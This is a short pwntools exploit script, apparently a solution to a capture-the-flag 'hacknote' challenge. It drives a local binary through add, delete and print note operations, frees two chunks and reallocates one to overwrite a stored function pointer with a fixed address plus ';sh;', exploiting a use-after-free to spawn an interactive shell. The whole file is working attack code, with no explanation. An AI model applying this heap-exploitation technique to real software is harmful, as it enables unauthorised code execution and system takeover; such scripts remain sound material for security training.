
from pwn import *

p = process('./hacknote')

def launch_gdb():
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c'] 
    gdb.attach(proc.pidof(p)[0]) 

def addnote(size, content):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(size))
    p.recvuntil(":")
    p.sendline(content)


def delnote(idx):
    p.recvuntil(":")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(idx))


def printnote(idx):
    p.recvuntil(":")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(idx))


magic = 0x08048506
addnote(32, "aaaa") # add note 0
addnote(32, "ddaa") # add note 1
delnote(0) # delete note 0
delnote(1) # delete note 1
addnote(8, p32(magic)+';sh;') # add note 2
printnote(0) # print note 0

p.interactive()
